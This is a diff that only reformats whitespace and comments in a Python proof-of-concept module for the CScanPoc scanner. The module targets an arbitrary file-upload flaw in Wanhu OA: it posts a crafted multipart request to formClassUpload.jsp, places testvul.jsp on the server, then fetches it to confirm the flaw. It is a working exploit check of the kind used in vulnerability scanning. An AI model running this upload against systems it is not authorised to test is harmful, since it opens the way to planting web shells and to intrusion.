@@ -4,11 +4,12 @@ from CScanPoc.thirdparty import requests, hackhttp
 from CScanPoc import ABPoc, ABVuln, VulnLevel, VulnType
 import re
 
+
 class Vuln(ABVuln):
-    vuln_id = 'Whir_0011' # 平台漏洞编号，留空
+    vuln_id = 'Whir_0011'  # 平台漏洞编号，留空
     name = '万户OA系统 文件上传'  # 漏洞名称
     level = VulnLevel.HIGH  # 漏洞危害级别
-    type = VulnType.FILE_UPLOAD # 漏洞类型
+    type = VulnType.FILE_UPLOAD  # 漏洞类型
     disclosure_date = 'Unknown'  # 漏洞公布时间
     desc = '''
         万户OA系统 /defaultroot/devform/workflow/testvul.jsp页面未做限制，可上传任意文件。
@@ -18,6 +19,7 @@ class Vuln(ABVuln):
     cve_id = 'Unknown'  # cve编号
     product = '万户OA'  # 漏洞应用名称
     product_version = 'Unknown'  # 漏洞应用版本
+
 
 class Poc(ABPoc):
     poc_id = '930240d2-e62e-4e4c-9c4d-db8005675923'
@@ -31,8 +33,8 @@ class Poc(ABPoc):
         try:
             self.output.info('开始对 {target} 进行 {vuln} 的扫描'.format(
                 target=self.target, vuln=self.vuln))
-            
-            hh =hackhttp.hackhttp()
+
+            hh = hackhttp.hackhttp()
             raw = '''
 POST /defaultroot/customize/formClassUpload.jsp?flag=1&returnField=null HTTP/1.1
 Host: localhost
@@ -63,9 +65,10 @@ Content-Disposition: form-data; name="submit"
             # code, head,res, errcode, _ = curl.curl2(url,proxy=proxy,raw=raw)
             code1, head1, res1, errcode1, _url1 = hh.http(url, raw=raw)
             shell_path = '/defaultroot/devform/customize/' + 'testvul.jsp'
-            code2, head2, res2, errcode2, _url2 = hh.http(self.target + shell_path)
-            if code2 == 200 and 'testvul_uploadfile_test' in res2: 
-                #security_hole(url)
+            code2, head2, res2, errcode2, _url2 = hh.http(
+                self.target + shell_path)
+            if code2 == 200 and 'testvul_uploadfile_test' in res2:
+                # security_hole(url)
                 self.output.report(self.vuln, '发现{target}存在{name}漏洞'.format(
                     target=self.target, name=self.vuln.name))
 
@@ -74,6 +77,7 @@ Content-Disposition: form-data; name="submit"
 
     def exploit(self):
         self.verify()
+
 
 if __name__ == '__main__':
     Poc().run()
